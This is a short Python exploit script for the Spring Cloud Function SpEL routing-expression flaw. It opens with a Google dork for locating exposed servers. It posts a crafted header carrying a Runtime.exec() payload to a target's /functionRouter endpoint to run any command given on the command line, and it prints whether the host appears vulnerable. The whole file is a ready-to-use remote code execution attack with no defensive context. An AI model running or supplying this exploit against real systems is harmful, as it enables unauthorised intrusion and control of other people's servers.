# Google Dork: intext:"Spring Cloud Function SPeL"

import requests
import sys
import urllib3
urllib3.disable_warnings()

def rce(ip, cmd):

    payload=f'T(java.lang.Runtime).getRuntime().exec("{cmd}")'
    data = 'd'
    headers = {
        'spring.cloud.function.routing-expression':payload,
        'Accept-Encoding': 'gzip, deflate',
        'Accept': '*/*',
        'Accept-Language': 'en',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36',
        'Content-Type': 'application/x-www-form-urlencoded',

    }

    uri = f'http://{ip}/functionRouter'

    try:
        req = requests.post(url=uri,headers=headers,data=data,verify=False,timeout=3)
        text = req.text
        response = '"error":"Internal Server Error"'
        if response in text:
            print(f'[+] Host is vulnerable')
            print(f'[+] Command executed')
            print(f'[+] Exploit completed')
        else:
            print(f'[-] {uri} not vulnerable')
    except requests.exceptions.RequestException:
        print('[-] Request timed out')
    except:
        print(f'[-] Error in {uri}')
        
if __name__ == '__main__' :
    if len(sys.argv) < 3:
        print('Usage:')
        print(f'python3 {sys.argv[0]} <IP> command')
        print('Example: python3 exploit.py 10.10.10.10 whoami')
        exit()
    rce(sys.argv[1], sys.argv[2])